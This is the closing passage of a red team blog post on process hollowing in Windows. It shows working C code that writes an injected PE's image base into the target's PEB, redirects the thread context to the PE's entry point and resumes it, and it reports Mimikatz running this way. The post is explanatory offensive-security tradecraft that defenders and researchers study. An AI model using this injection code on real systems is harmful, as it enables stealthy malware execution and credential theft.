    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fixImports</span><span class="p">(</span><span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">mod</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    
    <span class="n">CONTEXT</span> <span class="n">CTX</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="n">CTX</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>

    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bGetContext</span> <span class="o">=</span> <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bGetContext</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to get the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bWritePEB</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">CTX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD64</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bWritePEB</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to write the image base in the PEB.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">CTX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>

    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bSetContext</span> <span class="o">=</span> <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSetContext</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to set the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">);</span>
    
    <span class="n">retrieveOutput</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">hStdOut</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/mimikatzRunning.png" alt="Mimikatz successfuly running" /></p>

<p>We finally have a fully PE runner in a remote process and we can retrieve the output.</p>

<h2 id="plot-twist">Plot Twist</h2>

<p>Recently <a href="https://maldevacademy.com/new/modules/38">maldev academy</a> published an update where they also perform process hollowing. However by reading it, I realized that if we copy our PE at its prefered image base address contained in its NT Header, we do not need to perform relocation nor IAT patching.</p>

<p>However, this technic allows to learn more about how the libraries are loaded in a process. Also, by using this technic, you can only copy the PE sections without the headers (header stomping). And you can avoid memory pages overlap by not forcing the address of the allocation.</p>

<p>Hope you enjoyed it and learned something in this <del>too</del> long blog post.</p>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.ired.team">ired.team</a> that allowed me to learn about basic process hollowing</li>
  <li><a href="https://maldevacademy.com/">maldev academy</a> that allowed me to learn about API Set names</li>
  <li><a href="https://github.com/HavocFramework/Havoc">Havoc source code</a> that allowed me to learn more about forwarded functions</li>
  <li><a href="https://0xrick.github.io/win-internals/pe1/">0xrick blog</a> that allowed me to learn more about PE format</li>
  <li><a href="https://www.geoffchappell.com/index.htm">Geoff Chappell website</a> that allowed me to have a better understanding about Windows internal structures</li>
  <li><a href="https://ntdoc.m417z.com/">m417z Native API documentation</a> that allowed me to access definition of Native Windows C structures</li>
</ul>

        <aside class="sidebar inline" id="post-end">
    



<div class="tag-cloud">
    
        <ul class="tags inline">
            
                <li><a href="./tag.html?tag=Code+injection" class="tag inline">Code injection</a></li>
            
                <li><a href="./tag.html?tag=Coding" class="tag inline">Coding</a></li>
            
                <li><a href="./tag.html?tag=Malware+Developpement" class="tag inline">Malware Developpement</a></li>
            
                <li><a href="./tag.html?tag=Windows" class="tag inline">Windows</a></li>
            
    
        </ul>
</div>
    <div class="share-options inline">
    <div class="share-hover inline">
        <span class="share-button inline"><svg fill="currentColor" width="25" height="25" class="inline"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></span>
        <div class="share-icons inline" id="post-end-icons">
            <a class="twitter" href="https://twitter.com/intent/tweet?text=How to perform a Complete Process Hollowing&url=http://localhost:4000/complete-process-hollowing.html" title="Share on Twitter" rel="nofollow" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
            <a class="facebook" href="https://facebook.com/sharer.php?u=http://localhost:4000/complete-process-hollowing.html" title="Share on Facebook" rel="nofollow" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
            <a class="reddit" href="http://www.reddit.com/submit?url=http://localhost:4000/complete-process-hollowing.html&title=How to perform a Complete Process Hollowing" title="Submit to Reddit" rel="nofollow" target="_blank"><i class="fa fa-reddit" aria-hidden="true"></i></a>
            <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/complete-process-hollowing.html&title=How to perform a Complete Process Hollowing&summary=A blog post to explain how we can perform process hollowing with IAT patching.&source=http://localhost:4000/complete-process-hollowing.html" title="Share on LinkedIn" rel="nofollow" target="_blank"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
            <a class="email" href="mailto:?subject=How to perform a Complete Process Hollowing&body=A blog post to explain how we can perform process hollowing with IAT patching.%0A%0ARead more here: http://localhost:4000/complete-process-hollowing.html" title="Share via e-mail" rel="nofollow" target="_blank"><i class="fa fa-envelope" aria-hidden="true"></i></a>
            <a class="copy-link" onclick="copyToClipboard()" title="Copy to clipboard" rel="nofollow" target="_blank"><svg width="20px" fill="currentColor" class="inline" viewBox="0 0 18 18"><path d="M16.94 1.1A3.7 3.7 0 0 0 14.3 0c-1 0-1.94.39-2.64 1.1L7.43 5.3c-.91.92-2.09 3.2 0 5.27a.75.75 0 0 0 .82.16c.09-.03.17-.09.24-.15a.74.74 0 0 0 0-1.06c-1.16-1.15-.77-2.39-.02-3.16l4.24-4.22a2.2 2.2 0 0 1 1.58-.65c.6 0 1.16.23 1.58.65.86.87.86 2.29 0 3.16L12.7 8.47a.74.74 0 0 0 1.04 1.05l3.17-3.16a3.73 3.73 0 0 0 0-5.27h.03zM9.54 7.4a.74.74 0 0 0 0 1.06c1.16 1.15.76 2.39 0 3.16l-4.22 4.22c-.42.42-.99.65-1.59.65a2.23 2.23 0 0 1-1.58-3.82l3.17-3.16A.73.73 0 0 0 5.54 9a.78.78 0 0 0-.22-.52.77.77 0 0 0-1.05 0L1.1 11.64A3.72 3.72 0 0 0 3.74 18c1 0 1.94-.39 2.65-1.1l4.23-4.2c.21-.22.94-1.02 1.13-2.2.18-1.12-.2-2.15-1.12-3.07-.27-.27-.78-.27-1.06 0l-.02-.02z" clip-rule="evenodd" fill-rule="evenodd"></path></svg></a>
        </div>
    </div>
    <div class='alert' style='font-size:.6em;color:var(--accent);text-align:center;'></div>
</div>
</aside>

        <div class="separator"></div>
        



<section class="author-box">
  <div class="narrow-column">
    <a href='https://red-team-sncf.github.io'><img src="./assets/img/Myself_Neon_grey.jpg" alt="Red Team SNCF" class="author-img"></a>
    <ul class="contact-icons">
      
      
      <li class="linkedin"><a class="linkedin" href="https://in.linkedin.com/in/SNCF" target="_blank"><i class="fa fa-linkedin"></i></a></li>
      
      
      <li class="github"><a class="github" href="http://github.com/red-team-sncf" target="_blank"><i class="fa fa-github"></i></a></li>
      
      
      
    </ul>
  </div>
  <div class="author-desc">
    <h3>Red Team SNCF</h3>
    <p>SNCF has a red team to assess the security level of the different information systems in the group.</p>
  </div>
</section>

        



<div class="recent-box">
  <h2 class="page-subtitle">Recent posts</h2>
  <div class="recent-list">
    
      
        <div class="recent-item">
          
          

          <a href="./complete-process-hollowing.html" class="recent-item-img" style="background: url('./assets/img/posts/20240124/ProcessHollowing.jpg') center no-repeat; background-size: cover;">
            <div class="recent-item-title">
              <span>How to perform a Complete Process Hollowing</span>
              

  <span class = "recent-item-meta">
  
  
  
  
    
    
    <p class="page_meta-readtime">
      
        35 minute read
      
    </p>
  
  
  </span>

            </div>
          </a>
        </div>
      
    
  </div>
</div> <!-- End Recent-Box -->

      </div>
    </div> <!-- End Wrapper -->
  </article>
  <div class="search-box">
  <div class="wrapper">
    <div class="search-grid">
      <form class="search-form">
        <div id="search-container">
          <input type="text" id="search-input" class="search" placeholder="Search">
        </div>
      </form>
      <ul id="results-container" class="results-search"></ul>
      <div class="icon-close-container">
        <span class="search-icon-close"><i class="fa fa-times" aria-hidden="true"></i></span>
      </div>
    </div>
  </div>
</div>

  




<footer class="main-footer">
    <div class="footer-wrapper">
        <div class="logo-symbol">
            <a class="logo-link" title="Red Team SNCF" href="./">
                <svg width="45px" height="45px" class="logo-symbol" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet" version="1.0" viewBox="0 0 649 649"><g fill="currentColor" stroke="none"><path d="M2938 6380 c-551 -53 -1031 -220 -1478 -514 -306 -201 -588 -470 -810 -771 -276 -374 -475 -850 -559 -1336 -64 -371 -53 -836 29 -1211 155 -712 552 -1347 1130 -1810 450 -360 1021 -589 1640 -659 58 -6 202 -12 320 -12 282 0 503 26 756 87 902 220 1680 841 2079 1661 303 622 402 1333 279 2005 -90 496 -313 984 -634 1390 -111 140 -378 404 -519 513 -456 352 -957 560 -1549 643 -126 17 -558 26 -684 14z m687 -220 c77 -11 189 -32 250 -46 127 -29 345 -94 345 -103 0 -4 -341 -188 -757 -409 l-757 -403 -41 22 c-22 13 -58 26 -79 29 l-40 5 -148 370 c-82 204 -150 377 -153 386 -10 29 325 119 570 153 169 24 174 24 430 21 183 -3 273 -8 380 -25z m-1292 -546 l157 -387 -24 -28 c-13 -16 -30 -44 -36 -64 -6 -19 -17 -35 -23 -35 -7 -1 -382 -54 -834 -119 -453 -64 -823 -115 -823 -111 0 3 43 62 95 132 269 358 584 630 980 844 90 49 321 153 341 154 6 0 81 -174 167 -386z m2026 347 l37 -20 129 -440 128 -440 -35 -39 c-20 -22 -37 -44 -39 -50 -3 -8 -290 13 -929 66 -775 65 -925 80 -928 92 -2 11 223 134 785 432 433 228 794 416 801 417 7 0 30 -8 51 -18z m204 -92 c420 -211 850 -600 1137 -1027 34 -51 60 -95 57 -98 -4 -4 -805 157 -859 172 -10 3 -18 12 -18 21 0 58 -78 133 -137 133 -18 0 -33 2 -33 5 0 3 -52 184 -116 403 -63 218 -117 405 -120 415 -3 9 -3 17 1 17 3 0 42 -19 88 -41z m-913 -894 c494 -41 904 -75 912 -75 7 -1 24 -23 36 -51 l24 -50 -169 -269 -168 -270 -44 0 c-24 0 -63 -9 -86 -21 l-42 -21 -679 402 c-373 222 -688 409 -699 416 -18 13 -18 14 -1 14 10 0 422 -34 916 -75z m-1175 18 l48 -48 -31 -225 c-18 -124 -60 -417 -94 -652 l-62 -428 -44 0 c-24 0 -51 -4 -61 -10 -16 -8 -146 87 -777 566 -418 317 -761 578 -763 580 -3 3 0 9 5 14 8 8 1633 247 1700 249 25 1 42 -9 79 -46z m915 -414 l690 -411 0 -38 0 -37 -147 -46 c-82 -26 -453 -148 -825 -271 l-676 -223 -22 30 -22 29 98 669 c82 557 101 669 114 669 8 0 31 9 50 19 19 11 38 20 43 20 4 1 318 -184 697 -410z m1959 175 c251 -53 457 -97 457 -98 9 -9 123 -247 153 -320 113 -272 189 -599 209 -901 l9 -130 -231 -273 c-224 -265 -232 -273 -264 -270 l-34 3 -418 1013 -419 1013 26 30 c15 16 33 29 41 29 8 0 220 -43 471 -96z m-593 2 c6 -5 804 -1949 802 -1952 -2 -2 -274 272 -605 609 l-600 612 13 32 c20 46 17 82 -9 128 l-23 41 170 271 171 272 40 -6 c22 -3 41 -6 41 -7z m-3341 -611 c402 -307 733 -561 737 -564 31 -26 -38 -31 -947 -65 -516 -19 -941 -33 -944 -30 -2 2 6 77 18 165 49 346 162 693 324 986 44 82 52 91 66 79 9 -7 345 -264 746 -571z m2710 -142 c17 -16 39 -32 48 -38 15 -9 13 -64 -23 -695 -22 -377 -40 -686 -40 -687 0 -2 -8 -3 -19 -3 -10 0 -30 -9 -45 -21 l-27 -21 -342 200 c-188 110 -542 317 -787 460 -245 144 -445 266 -445 273 0 8 312 116 820 285 451 150 822 272 824 273 2 1 18 -11 36 -26z m590 -425 c220 -222 500 -505 623 -629 l223 -225 -17 -31 -18 -30 -585 -82 c-322 -45 -602 -85 -621 -88 -31 -4 -37 -1 -53 27 -11 17 -34 39 -53 47 -19 9 -34 21 -34 27 -1 6 16 316 37 688 l37 678 26 9 c14 5 27 10 30 10 3 1 185 -180 405 -401z m-2587 -114 c-2 -9 -224 -178 -494 -375 l-492 -359 -38 16 c-26 11 -53 14 -84 10 -25 -3 -55 -7 -67 -8 -16 -2 -106 76 -362 316 -204 192 -341 327 -341 338 0 16 10 18 83 19 45 0 431 13 857 28 984 36 942 35 938 15z m59 -88 l22 -23 -104 -467 c-58 -256 -105 -468 -105 -470 0 -2 -14 -6 -32 -10 -17 -3 -47 -18 -65 -32 l-34 -26 -339 122 -338 122 -7 45 c-5 37 -3 47 12 58 10 7 229 169 488 359 258 190 472 346 475 346 3 0 15 -11 27 -24z m1013 -430 c421 -245 769 -452 775 -460 5 -8 7 -18 3 -21 -3 -4 -417 -41 -920 -84 l-913 -77 -16 26 c-9 15 -29 36 -45 47 l-28 21 104 465 105 465 43 7 c27 4 55 17 75 35 18 16 37 28 42 26 6 -2 354 -204 775 -450z m-2307 -276 c-7 -71 -4 -98 10 -126 l15 -30 -206 -248 -206 -248 -27 59 c-140 314 -228 733 -229 1086 l0 138 323 -303 c270 -254 322 -307 320 -328z m5277 366 c-17 -270 -58 -489 -135 -721 -38 -117 -134 -350 -140 -343 -1 2 -35 117 -75 256 l-72 253 26 25 c51 52 58 134 15 189 -21 26 -21 26 -2 48 11 12 102 120 203 240 100 120 184 216 186 214 2 -2 -1 -74 -6 -161z m-642 -487 l21 -41 -456 -782 c-251 -429 -461 -787 -467 -794 -9 -9 -19 -10 -42 -2 l-29 10 -174 676 -174 675 35 37 c20 20 40 51 45 67 l10 30 584 82 c321 44 594 82 605 82 16 1 27 -10 42 -40z m-4015 -145 c301 -109 327 -120 327 -142 0 -12 7 -39 15 -58 l15 -36 -411 -469 c-226 -259 -413 -468 -415 -466 -2 2 1 219 6 483 5 263 10 538 10 610 l0 132 29 12 c16 6 39 23 52 36 13 14 28 23 34 21 5 -2 157 -57 338 -123z m-517 -413 c-3 -262 -9 -527 -12 -589 -8 -134 -2 -135 -120 20 -93 121 -192 278 -272 428 l-61 115 215 257 c181 216 218 255 235 251 l22 -6 -7 -476z m4695 460 c3 -3 43 -133 88 -289 l82 -282 -62 -108 c-75 -130 -175 -278 -265 -392 -140 -176 -514 -528 -595 -558 -13 -5 -72 -13 -130 -17 l-105 -7 -16 40 -16 40 462 796 461 796 45 -6 c25 -4 48 -9 51 -13z m-1736 -69 c-6 -5 -361 -192 -790 -417 -429 -224 -806 -422 -838 -439 -52 -28 -59 -29 -70 -15 -17 22 -78 59 -99 59 -19 0 -16 -14 -68 300 -29 169 -38 246 -30 248 27 9 62 50 74 87 11 32 19 41 43 44 67 8 1683 139 1733 140 30 0 50 -3 45 -7z m90 -62 c10 -11 38 -26 62 -31 38 -10 44 -16 52 -48 90 -346 333 -1280 337 -1292 3 -11 -7 -23 -29 -36 -19 -11 -42 -38 -53 -60 l-19 -40 -1050 297 c-859 244 -1050 301 -1050 315 0 12 239 141 860 465 473 247 863 449 866 449 3 1 14 -8 24 -19z m-2076 -210 c13 0 21 -9 25 -27 10 -47 86 -497 86 -508 0 -5 -13 -19 -29 -29 -35 -24 -57 -59 -66 -108 -4 -22 -14 -39 -24 -42 -143 -41 -861 -236 -870 -236 -7 0 -11 5 -9 11 2 6 190 224 418 484 349 399 416 472 431 464 10 -5 27 -9 38 -9z m1376 -1065 c741 -208 1053 -300 1060 -312 6 -9 24 -32 41 -52 l31 -35 -30 -68 c-34 -77 -25 -71 -205 -139 -310 -116 -653 -180 -984 -183 -97 0 -178 1 -181 4 -89 106 -817 1053 -817 1063 0 18 9 27 23 21 7 -2 485 -137 1062 -299z m-1319 264 c31 -35 81 -51 134 -44 l46 6 380 -487 c208 -268 385 -496 392 -506 13 -17 10 -18 -45 -12 -640 65 -1267 346 -1732 776 l-61 57 42 12 c271 74 805 218 814 218 6 1 19 -9 30 -20z m2814 -563 c0 -5 -223 -138 -278 -165 -24 -13 -46 -20 -49 -18 -2 3 3 19 11 36 12 22 27 33 59 42 27 7 56 26 81 52 35 37 44 41 105 47 36 4 67 8 69 9 1 0 2 -1 2 -3z" transform="translate(0.000000,644.000000) scale(0.100000,-0.100000)"/></g></svg>
            </a>
        </div>
        <div class="copyright">
          <p>2024 &copy; Red Team SNCF</p>
        </div>
        <div class="footer-nav">
            <div>
                <a href="./archive.html">
                    Posts
                </a>
            </div>
            <div>
                <a href="./tags.html">
                    Tags
                </a>
            </div>
            <div>
                <a href="./about.html">
                    About
                </a>
            </div>
        </div>
    </div>
</footer> <!-- End Footer -->

</div>

    <div class="top" title="Top">
      <svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="angle-up" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512" class="svg-inline--fa fa-angle-up fa-w-8 fa-2x"><path fill="currentColor" d="M136.5 185.1l116 117.8c4.7 4.7 4.7 12.3 0 17l-7.1 7.1c-4.7 4.7-12.3 4.7-17 0L128 224.7 27.6 326.9c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17l116-117.8c4.7-4.6 12.3-4.6 17 .1z" class=""></path></svg>
    </div>
    




<!-- JS -->








<script>
(function() {
    var sw = document.getElementById('theme-switch');
    var html = document.getElementsByTagName('html')[0];
    var logo = document.getElementById('logo');
    var nightModeOption = ('auto' || 'auto').toLowerCase();
    var storage = nightModeOption === 'manual'
        ? localStorage
        : sessionStorage;
    var themeData = loadThemeData();

    function saveThemeData(data) {
    storage.setItem('theme', JSON.stringify(data));
    }

    function loadThemeData() {
    var data = storage.getItem('theme');
    try {
        data = JSON.parse(data ? data : '');
    } catch(e) {
        data = { nightShift: undefined, autoToggleAt: 0 };
        saveThemeData(data);
    }
    return data;
    }

    function handleThemeToggle(nightShift) {
    themeData.nightShift = nightShift;
    saveThemeData(themeData);
    html.dataset.theme = nightShift ? 'dark' : 'light';
    if (nightShift) {
        logo.setAttribute("src", "./assets/img/branding/SNCF_Full.png");
    } else {
        logo.setAttribute("src", "./assets/img/branding/SNCF_Full.png");
    }
    setTimeout(function() {
        sw.checked = nightShift ? true : false;
    }, 50);
    }

    function autoThemeToggle() {
    // Next time point of theme toggle
    var now = new Date();
    var toggleAt = new Date();
    var hours = now.getHours();
    var nightShift = hours >= 19 || hours <=7;

    if (nightShift) {
        if (hours > 7) {
        toggleAt.setDate(toggleAt.getDate() + 1);
        }
        toggleAt.setHours(7);
    } else {
        toggleAt.setHours(19);
    }

    toggleAt.setMinutes(0);
    toggleAt.setSeconds(0);
    toggleAt.setMilliseconds(0)

    var delay = toggleAt.getTime() - now.getTime();

    // auto toggle theme mode
    setTimeout(function() {
        handleThemeToggle(!nightShift);
    }, delay);

    return {
        nightShift: nightShift,
        toggleAt: toggleAt.getTime()
    };
    }

    // Listen the theme toggle event
    sw.addEventListener('change', function(event) {
    handleThemeToggle(event.target.checked);
    });

    if (nightModeOption == 'auto') {
    var data = autoThemeToggle();

    // Toggle theme by local setting
    if (data.toggleAt > themeData.autoToggleAt) {
        themeData.autoToggleAt = data.toggleAt;
        handleThemeToggle(data.nightShift);
    } else {
        handleThemeToggle(themeData.nightShift);
    }
    } else if (nightModeOption == 'manual') {
    handleThemeToggle(themeData.nightShift);
    } else {
    var nightShift = themeData.nightShift;
    if (nightShift === undefined) {
        nightShift = nightModeOption === 'on';
    }
    handleThemeToggle(nightShift);
    }
})();
</script>

<script src="./assets/js/jekyll-search.js"></script>
<script src="./assets/js/jquery-3.6.0.min.js"></script>


  <script>
    function toggle_comments(){
      var commentCurtain = document.getElementById('comment-curtain')
      if (commentCurtain) {
        commentCurtain.classList.toggle('hide')
      }
      var disqusThread = document.getElementById('comment-layout')
      if (disqusThread) {
        disqusThread.classList.toggle('show')
      }
    }

    function copyToClipboard() {
      navigator.clipboard.writeText('http://localhost:4000/complete-process-hollowing.html').then(function() {
      alerts = document.getElementsByClassName('alert')
      for (i=0; i < alerts.length; i++){
        alerts[i].innerHTML='\u00ABlink copied\u00BB';
        setTimeout((function(i){ return function(){alerts[i].innerHTML='';}})(i), 1600 );
      };
      }, function() {
        prompt("Unable to copy, please use this link:", "http://localhost:4000/complete-process-hollowing.html");
      });
    }

    $(function () {
      if (document.getElementById('comment-curtain') == null){
        var disqusThread = document.getElementById('comment-layout')
        if (disqusThread) {
          disqusThread.classList.toggle('show')
        }
      }

      var tweetTags = document.getElementsByTagName("tweet");

      if (tweetTags != null){
        for (i=0; i<tweetTags.length; i++){
          tweetA = document.createElement("a")
          tweetA.href = 'https://twitter.com/share?text='
                       + encodeURIComponent(tweetTags[i].textContent)
                       + '&via=&url='
                       + window.location.href;
          tweetA.target = "_blank";
          tweetA.className = 'twitter';
          tweetSpanText = document.createElement('span');
          tweetSpanText.className = 'tweetText';
          tweetSpanText.appendChild(document.createTextNode(tweetTags[i].textContent));
          tweetSpanIcon = document.createElement('span');
          tweetSpanIcon.className = 'tweetIcon';
          tweetSpanIcon.appendChild(document.createTextNode("click to tweet"));
          tweetI = document.createElement("i");
          tweetI.className = 'fa fa-twitter';
          tweetSpanIcon.appendChild(tweetI);
          tweetA.appendChild(tweetSpanText);
          tweetA.appendChild(tweetSpanIcon);
          tweetTags[i].textContent = "";
          tweetTags[i].appendChild(tweetA);
        }
      }

    });

  </script>
  <!-- Mailchimp linking -->
  <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/8ece198b3eb260e6838461a60/d20d9fb9aad962399025da52e.js");</script>





  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    extensions: ["tex2jax.js"],
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
      processEscapes: true
    },
    "CommonHTML": { linebreaks: { automatic: true } }
    });
  </script>
  <script src="//mathjax.rstudio.com/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>


<script src="./assets/js/main.js"></script>
<script>
  SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('results-container'),
      json: './search.json',
      searchResultTemplate: '<li><a href="{url}" title="{description}">{title}</a><p>{description}</p></li>',
      noResultsText: 'No results found',
      fuzzy: false,
      exclude: ['Welcome']
    });
</script>




    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', '');
</script>
  </body>
</html>
